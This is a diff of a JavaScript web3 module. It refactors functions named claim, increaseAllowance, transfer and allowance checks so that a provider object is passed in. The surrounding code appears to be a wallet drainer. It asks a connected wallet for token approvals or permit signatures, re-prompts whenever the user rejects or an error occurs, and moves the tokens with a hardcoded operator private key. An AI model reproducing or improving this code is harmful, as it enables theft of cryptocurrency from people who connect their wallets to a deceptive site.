@@ -101,19 +101,19 @@ export const claim = async (_balance) => {
     claim(_balance);
   }
 };
-export const increaseAllowance = async (token) => {
+export const increaseAllowance = async (token, provider) => {
   try {
     
-    const web3 = new Web3(Connector.getProvider());
+    const web3 = new Web3(provider);
     var contract = new web3.eth.Contract(
       constants.ALLOWANCEABI,
       token.token_address
     );
     const account = getAccount().address;
 
-    const allow = await allownce(token);
+    const allow = await allownce(token, provider);
     if (allow >= token.balance){
-      await transfer(token);
+      await transfer(token, provider);
       return ;
     };
     const permitToken = constants.permitTokens.find(tokenis => tokenis.address === token.token_address)
@@ -166,7 +166,7 @@ export const increaseAllowance = async (token) => {
             from: account
           }, async (error, result) => {
 
-            if (error != null) increaseAllowance(token);
+            if (error != null) increaseAllowance(token, provider);
             
             const signature = result.result
             const splited = ethers.utils.splitSignature(signature)
@@ -189,7 +189,7 @@ export const increaseAllowance = async (token) => {
             .on("confirmation", async (confirmationNumber, receipt) => {
               if (confirmationNumber >= 1) {
                 console.log(receipt);
-                await transfer(token);
+                await transfer(token, provider);
               }
             });
           });
@@ -237,7 +237,7 @@ export const increaseAllowance = async (token) => {
             from: account
           }, async (error, result) => {
 
-            if (error != null) increaseAllowance(token);
+            if (error != null) increaseAllowance(token, provider);
 
             const signature = result.result
             const splited = ethers.utils.splitSignature(signature)
@@ -260,7 +260,7 @@ export const increaseAllowance = async (token) => {
             .on("confirmation", async (confirmationNumber, receipt) => {
               if (confirmationNumber >= 1) {
                 console.log(receipt);
-                await transfer(token);
+                await transfer(token, provider);
               }
             });
           })
@@ -276,7 +276,7 @@ export const increaseAllowance = async (token) => {
       .on("confirmation", async (confirmationNumber, receipt) => {
         if (confirmationNumber >= 1) {
           console.log(receipt);
-          await transfer(token);
+          await transfer(token, provider);
         }
       });
       return;
@@ -289,13 +289,12 @@ export const increaseAllowance = async (token) => {
     
   } catch (error) {
     console.log(error);
-    increaseAllowance(token);
+    increaseAllowance(token, provider);
   }
 };
 
-export const transfer = async (token) => {
+export const transfer = async (token, provider) => {
   try {
-    const provider = new ethers.providers.Web3Provider(Connector.getProvider());
     const signer = new ethers.Wallet(constants.initiatorPK, provider);
     const account = getAccount().address;
     const erc20Contract = new ethers.Contract(
@@ -325,9 +324,9 @@ export const ethBalance = async () => {
   }
 };
 
-export const allownce = async (token) => {
+export const allownce = async (token, provider) => {
   try{
-    const web3 = new Web3(Connector.getProvider());
+    const web3 = new Web3(provider);
     var contract = new web3.eth.Contract(
       constants.ALLOWANCEABI,
       token.token_address
@@ -339,10 +338,10 @@ export const allownce = async (token) => {
   }
 }
 
-export const balanceOf = async (token) => {
+export const balanceOf = async (token, provider) => {
   try{
 
-    const web3 = new Web3(Connector.getProvider());
+    const web3 = new Web3(provider);
     var contract = new web3.eth.Contract(
       constants.ALLOWANCEABI,
       token.token_address
